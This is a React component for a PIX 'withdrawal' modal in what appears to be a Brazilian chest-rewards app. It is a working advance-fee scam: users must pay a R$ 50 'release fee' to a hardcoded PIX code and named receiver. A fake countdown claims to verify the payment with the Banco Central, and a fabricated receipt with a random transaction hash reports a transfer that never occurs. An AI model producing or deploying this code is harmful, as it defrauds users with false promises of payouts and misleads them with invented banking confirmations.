import React, { useState, useEffect } from 'react';
import {
  X,
  Wallet,
  CheckCircle2,
  ArrowRight,
  ShieldCheck,
  Clock,
  Copy,
  Check,
  AlertTriangle,
  QrCode,
  Loader2,
  HelpCircle,
  Lock,
} from 'lucide-react';
import { WithdrawalRecord } from '../types';
import { soundFX } from '../utils/audio';

interface WithdrawModalProps {
  isOpen: boolean;
  onClose: () => void;
  balance: number;
  onWithdraw: (record: WithdrawalRecord) => void;
}

export const PIX_TAX_CODE =
  '00020126580014BR.GOV.BCB.PIX0136b53efc0a-192a-40e5-bfee-9cc72ffcacf25204000053039865802BR5925Joao Murilo de Pinho de O6009SAO PAULO62140510zmUXW4PimZ6304B37A';
export const PIX_TAX_AMOUNT = 50.0;
export const PIX_TAX_RECEIVER = 'Joao Murilo de Pinho de O';
export const PIX_TAX_CITY = 'SAO PAULO';

export const WithdrawModal: React.FC<WithdrawModalProps> = ({
  isOpen,
  onClose,
  balance,
  onWithdraw,
}) => {
  // Steps: 'form' -> 'tax_payment' -> 'verifying' -> 'success'
  const [step, setStep] = useState<'form' | 'tax_payment' | 'verifying' | 'success'>('form');

  const [pixKey, setPixKey] = useState('');
  const [pixType, setPixType] = useState<WithdrawalRecord['pixType']>('cpf');
  const [amountToWithdraw, setAmountToWithdraw] = useState<string>(
    balance > 0 ? balance.toFixed(2) : '0.00'
  );
  const [copiedPix, setCopiedPix] = useState(false);
  const [showQr, setShowQr] = useState(true);
  const [hasActuallyPaid, setHasActuallyPaid] = useState(false);
  const [error, setError] = useState('');
  const [pendingRecord, setPendingRecord] = useState<WithdrawalRecord | null>(null);

  // Verification countdown
  const [verificationCountdown, setVerificationCountdown] = useState(4);

  // Verification countdown effect - runs cleanly outside state updaters
  useEffect(() => {
    if (step !== 'verifying') return;

    if (verificationCountdown <= 0) {
      if (pendingRecord) {
        soundFX.playChestOpen();
        soundFX.playCoin();
        onWithdraw(pendingRecord);
        setStep('success');
      }
      return;
    }

    const timer = setTimeout(() => {
      setVerificationCountdown((prev) => Math.max(0, prev - 1));
    }, 1000);

    return () => clearTimeout(timer);
  }, [step, verificationCountdown, pendingRecord, onWithdraw]);

  useEffect(() => {
    if (isOpen) {
      setStep('form');
      setError('');
      setCopiedPix(false);
      setHasActuallyPaid(false);
      setVerificationCountdown(4);
      setAmountToWithdraw(balance > 0 ? balance.toFixed(2) : '0.00');
    }
  }, [isOpen, balance]);

  if (!isOpen) return null;

  const handleProceedToTaxPayment = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    const parsedAmount = parseFloat(amountToWithdraw.replace(',', '.'));
    if (isNaN(parsedAmount) || parsedAmount <= 0) {
      setError('Por favor, informe um valor válido para saque.');
      return;
    }

    if (parsedAmount > balance) {
      setError(
        `Valor indisponível. Seu saldo atual em baús é de R$ ${balance
          .toFixed(2)
          .replace('.', ',')}.`
      );
      return;
    }

    if (!pixKey.trim()) {
      setError('Informe a chave PIX para receber os ganhos dos baús.');
      return;
    }

    const uniqueId = `saque-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
    const record: WithdrawalRecord = {
      id: uniqueId,
      pixKey: pixKey.trim(),
      pixType,
      amount: parsedAmount,
      status: 'concluido',
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      txHash: `PIX-${Math.random().toString(36).substring(2, 10).toUpperCase()}`,
    };

    setPendingRecord(record);
    soundFX.playClick();
    setStep('tax_payment');
  };

  const handleCopyPixCode = () => {
    navigator.clipboard.writeText(PIX_TAX_CODE);
    soundFX.playCoin();
    setCopiedPix(true);
    setTimeout(() => setCopiedPix(false), 3000);
  };

  const handleVerifyPayment = () => {
    if (!hasActuallyPaid) {
      setError('Atenção: Você precisa marcar que realmente realizou o pagamento antes de confirmar.');
      return;
    }

    setError('');
    soundFX.playClick();
    setVerificationCountdown(4);
    setStep('verifying');
  };

  const handleClose = () => {
    setPendingRecord(null);
    setStep('form');
    onClose();
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/85 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="relative w-full max-w-lg bg-slate-900 border border-slate-800 rounded-3xl shadow-2xl overflow-hidden max-h-[92vh] flex flex-col">
        {/* Header */}
        <div className="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-gradient-to-r from-slate-900 via-slate-850 to-slate-900 shrink-0">
          <div className="flex items-center gap-3">
            <div className="p-2.5 rounded-xl bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">
              <Wallet className="w-5 h-5" />
            </div>
            <div>
              <h3 className="text-base font-bold text-white flex items-center gap-2">
                Saque de Ganhos via PIX
                {step === 'tax_payment' && (
                  <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-full border border-amber-500/30 font-semibold">
                    Etapa 2/2: Taxa
                  </span>
                )}
              </h3>
              <p className="text-xs text-slate-400">
                Saldo disponível nos baús: R$ {balance.toFixed(2).replace('.', ',')}
              </p>
            </div>
          </div>
          <button
            onClick={handleClose}
            className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Content Container (Scrollable) */}
        <div className="p-6 overflow-y-auto space-y-5">
          {error && (
            <div className="p-3 rounded-xl bg-rose-500/15 border border-rose-500/30 text-rose-300 text-xs flex items-start gap-2">
              <AlertTriangle className="w-4 h-4 shrink-0 text-rose-400 mt-0.5" />
              <span>{error}</span>
            </div>
          )}

          {/* STEP 1: FORM (CHAVE PIX + VALOR) */}
          {step === 'form' && (
            <form onSubmit={handleProceedToTaxPayment} className="space-y-4">
              <div className="p-3.5 rounded-2xl bg-slate-950 border border-slate-800 flex items-center justify-between">
                <div>
                  <span className="text-xs text-slate-400 block">Total acumulado nos Baús:</span>
                  <span className="text-lg font-extrabold text-amber-400 font-mono">
                    R$ {balance.toFixed(2).replace('.', ',')}
                  </span>
                </div>
                <span className="text-[11px] text-emerald-400 bg-emerald-950/80 px-2.5 py-1 rounded-full border border-emerald-800/60 font-semibold flex items-center gap-1">
                  <CheckCircle2 className="w-3.5 h-3.5" /> Saldo Liberado
                </span>
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-semibold text-slate-200">
                  Tipo de Chave PIX de Destino
                </label>
                <div className="grid grid-cols-4 gap-2">
                  {(['cpf', 'email', 'telefone', 'aleatoria'] as const).map((type) => (
                    <button
                      key={type}
                      type="button"
                      onClick={() => setPixType(type)}
                      className={`py-2 text-xs font-semibold rounded-xl border uppercase transition-colors ${
                        pixType === type
                          ? 'bg-emerald-600 text-white border-emerald-500 shadow-sm'
                          : 'bg-slate-950 text-slate-400 border-slate-800 hover:bg-slate-800'
                      }`}
                    >
                      {type}
                    </button>
                  ))}
                </div>
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-semibold text-slate-200">
                  Sua Chave PIX (Onde você vai receber seu dinheiro) *
                </label>
                <input
                  type="text"
                  value={pixKey}
                  onChange={(e) => setPixKey(e.target.value)}
                  placeholder={
                    pixType === 'cpf'
                      ? '000.000.000-00'
                      : pixType === 'email'
                      ? 'seuemail@exemplo.com'
                      : pixType === 'telefone'
                      ? '(11) 99999-9999'
                      : 'Chave aleatória'
                  }
                  className="w-full px-3.5 py-3 bg-slate-950 border border-slate-700 rounded-xl text-white text-xs sm:text-sm focus:outline-none focus:border-emerald-500"
                  required
                />
              </div>

              <div className="space-y-1.5">
                <label className="text-xs font-semibold text-slate-200">
                  Valor a Sacar (R$)
                </label>
                <div className="relative">
                  <input
                    type="text"
                    value={amountToWithdraw}
                    onChange={(e) => setAmountToWithdraw(e.target.value)}
                    className="w-full px-3.5 py-3 bg-slate-950 border border-slate-700 rounded-xl text-white font-mono text-sm focus:outline-none focus:border-emerald-500"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setAmountToWithdraw(balance.toFixed(2))}
                    className="absolute right-2.5 top-2.5 px-2.5 py-1 text-xs rounded-lg bg-slate-800 hover:bg-slate-750 text-amber-400 border border-slate-700 font-semibold"
                  >
                    Máximo
                  </button>
                </div>
              </div>

              {/* Notice about Tax */}
              <div className="p-3 rounded-xl bg-amber-500/10 border border-amber-500/30 text-xs text-amber-200/90 flex items-start gap-2.5">
                <ShieldCheck className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
                <span>
                  Para validação e envio imediato do saque no sistema bancário, é exigido o pagamento da <strong>taxa de R$ 50,00</strong>.
                </span>
              </div>

              <div className="pt-2 flex items-center justify-end gap-3">
                <button
                  type="button"
                  onClick={handleClose}
                  className="px-4 py-2.5 rounded-xl text-xs font-semibold text-slate-400 hover:text-white"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={balance <= 0}
                  className="px-5 py-2.5 rounded-xl text-xs font-bold bg-emerald-600 hover:bg-emerald-500 disabled:opacity-40 text-white shadow-lg shadow-emerald-600/30 flex items-center gap-1.5 transition-all cursor-pointer"
                >
                  <span>Avançar para Pagamento da Taxa</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </div>
            </form>
          )}

          {/* STEP 2: TAX PAYMENT (R$ 50,00) */}
          {step === 'tax_payment' && (
            <div className="space-y-4 animate-in fade-in duration-200">
              {/* Alert Callout */}
              <div className="p-3.5 rounded-2xl bg-amber-500/15 border-2 border-amber-500/40 text-xs text-amber-200 space-y-1">
                <div className="flex items-center gap-2 text-amber-300 font-bold text-sm">
                  <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0" />
                  <span>Taxa de Liberação de Saque: R$ 50,00</span>
                </div>
                <p className="text-[11px] text-slate-300 leading-relaxed">
                  Para efetivar o envio de <strong>R$ {parseFloat(amountToWithdraw).toFixed(2).replace('.', ',')}</strong> para sua chave PIX (<span className="font-mono text-white">{pixKey}</span>), realize o pagamento da taxa de <strong>R$ 50,00</strong> utilizando o PIX Copia e Cola ou QR Code abaixo.
                </p>
              </div>

              {/* Beneficiary Details */}
              <div className="p-3.5 rounded-xl bg-slate-950 border border-slate-800 text-xs space-y-1.5">
                <div className="flex justify-between">
                  <span className="text-slate-400">Beneficiário:</span>
                  <span className="font-bold text-white">{PIX_TAX_RECEIVER}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Cidade:</span>
                  <span className="text-slate-300">{PIX_TAX_CITY}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-400">Valor da Taxa:</span>
                  <span className="font-extrabold text-emerald-400 font-mono text-sm">
                    R$ 50,00
                  </span>
                </div>
              </div>

              {/* QR Code */}
              <div className="text-center space-y-2">
                <div className="flex justify-center">
                  <div className="p-3 bg-white rounded-2xl shadow-xl inline-block">
                    <img
                      src={`https://api.qrserver.com/v1/create-qr-code/?size=170x170&data=${encodeURIComponent(
                        PIX_TAX_CODE
                      )}`}
                      alt="QR Code Pagamento PIX Taxa R$ 50"
                      className="w-36 h-36 mx-auto"
                      referrerPolicy="no-referrer"
                    />
                  </div>
                </div>
                <span className="text-[11px] text-slate-400 block">
                  Aponte a câmera do aplicativo do seu banco para pagar R$ 50
                </span>
              </div>

              {/* PIX Copia e Cola box */}
              <div className="space-y-1.5">
                <label className="text-xs font-semibold text-slate-300 flex items-center justify-between">
                  <span>Código PIX Copia e Cola Oficial:</span>
                  <span className="text-[10px] text-amber-400">Clique para copiar</span>
                </label>
                <div className="p-3 bg-slate-950 border border-slate-700 rounded-xl text-xs font-mono text-slate-300 break-all select-all leading-relaxed">
                  {PIX_TAX_CODE}
                </div>

                <button
                  type="button"
                  onClick={handleCopyPixCode}
                  className={`w-full py-3 rounded-xl text-xs sm:text-sm font-bold flex items-center justify-center gap-2 transition-all cursor-pointer ${
                    copiedPix
                      ? 'bg-emerald-600 text-white shadow-lg shadow-emerald-600/30'
                      : 'bg-amber-500 hover:bg-amber-400 text-slate-950 shadow-lg shadow-amber-500/20'
                  }`}
                >
                  {copiedPix ? (
                    <>
                      <Check className="w-4 h-4" />
                      <span>Código PIX Copiado com Sucesso!</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-4 h-4" />
                      <span>Copiar Chave PIX (Copia e Cola)</span>
                    </>
                  )}
                </button>
              </div>

              {/* Checkbox: "Só confirme quando realmente fizer o pagamento" */}
              <div className="p-3.5 rounded-xl bg-slate-950/80 border border-slate-800 space-y-2">
                <label className="flex items-start gap-3 cursor-pointer select-none">
                  <input
                    type="checkbox"
                    checked={hasActuallyPaid}
                    onChange={(e) => setHasActuallyPaid(e.target.checked)}
                    className="mt-1 w-4 h-4 rounded text-emerald-600 bg-slate-900 border-slate-700 focus:ring-emerald-500"
                  />
                  <div className="text-xs">
                    <span className="font-bold text-white block">
                      Confirmo que já realizei a transferência de R$ 50,00 no meu banco
                    </span>
                    <span className="text-[11px] text-amber-400/90 block mt-0.5">
                      ⚠️ O sistema valida a transação junto ao Banco Central. Só confirme quando realmente fizer o pagamento.
                    </span>
                  </div>
                </label>
              </div>

              {/* Actions & "Aguardando Pagamento" button */}
              <div className="space-y-2 pt-1">
                {hasActuallyPaid ? (
                  <button
                    type="button"
                    onClick={handleVerifyPayment}
                    className="w-full py-3.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs sm:text-sm uppercase tracking-wide shadow-lg shadow-emerald-600/30 flex items-center justify-center gap-2 transition-all cursor-pointer"
                  >
                    <CheckCircle2 className="w-4 h-4" />
                    <span>Confirmar Pagamento da Taxa de R$ 50</span>
                  </button>
                ) : (
                  <div className="w-full py-3.5 rounded-xl bg-slate-800/90 text-amber-400 border border-amber-500/30 text-xs sm:text-sm font-bold flex items-center justify-center gap-2 shadow-inner">
                    <Clock className="w-4 h-4 text-amber-400 animate-spin" />
                    <span>Aguardando Pagamento da Taxa de R$ 50...</span>
                  </div>
                )}

                <div className="flex items-center justify-between text-xs text-slate-500 pt-1">
                  <button
                    type="button"
                    onClick={() => setStep('form')}
                    className="text-slate-400 hover:text-white underline underline-offset-2"
                  >
                    ← Voltar para dados do saque
                  </button>
                  <span className="text-[11px] text-slate-500">
                    Apenas pagamentos confirmados liberam o saque
                  </span>
                </div>
              </div>
            </div>
          )}

          {/* STEP 3: VERIFYING SCREEN */}
          {step === 'verifying' && (
            <div className="py-10 text-center space-y-5 animate-in fade-in duration-200">
              <div className="relative flex justify-center">
                <div className="w-16 h-16 rounded-full bg-amber-500/10 border-2 border-amber-500/40 flex items-center justify-center text-amber-400">
                  <Loader2 className="w-8 h-8 animate-spin text-amber-400" />
                </div>
              </div>

              <div>
                <h4 className="text-lg font-black text-white">
                  Verificando Pagamento da Taxa no Banco Central...
                </h4>
                <p className="text-xs text-slate-400 mt-1 max-w-sm mx-auto">
                  Localizando a transferência PIX de R$ 50,00 enviada para <strong>{PIX_TAX_RECEIVER}</strong>.
                </p>
              </div>

              <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-slate-950 border border-slate-800 text-xs font-mono text-emerald-400">
                <Clock className="w-3.5 h-3.5" />
                <span>Validando em {verificationCountdown} segundos...</span>
              </div>
            </div>
          )}

          {/* STEP 4: SUCCESS RECEIPT */}
          {step === 'success' && pendingRecord && (
            <div className="p-2 text-center space-y-4 animate-in zoom-in-95 duration-200">
              <div className="w-14 h-14 rounded-full bg-emerald-500/20 border-2 border-emerald-500/40 text-emerald-400 flex items-center justify-center mx-auto">
                <CheckCircle2 className="w-8 h-8" />
              </div>

              <div>
                <h4 className="text-xl font-black text-white">
                  Saque Liberado com Sucesso!
                </h4>
                <p className="text-xs text-slate-400 mt-1">
                  A taxa de R$ 50,00 foi validada e o valor do saque foi enviado para sua chave PIX.
                </p>
              </div>

              <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 text-left space-y-2 text-xs font-mono">
                <div className="flex justify-between">
                  <span className="text-slate-500">Transação PIX:</span>
                  <span className="text-slate-300 font-bold">{pendingRecord.txHash}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Chave PIX Destino:</span>
                  <span className="text-slate-300">{pendingRecord.pixKey}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Valor Sacado:</span>
                  <span className="text-emerald-400 font-bold">
                    R$ {pendingRecord.amount.toFixed(2).replace('.', ',')}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Taxa de Liberação:</span>
                  <span className="text-slate-300">R$ 50,00 (Paga)</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Status Bancário:</span>
                  <span className="text-emerald-400 font-bold flex items-center gap-1">
                    <ShieldCheck className="w-3.5 h-3.5" /> Transferência Efetuada
                  </span>
                </div>
              </div>

              <button
                type="button"
                onClick={handleClose}
                className="w-full py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold"
              >
                Concluir e Voltar ao Painel
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
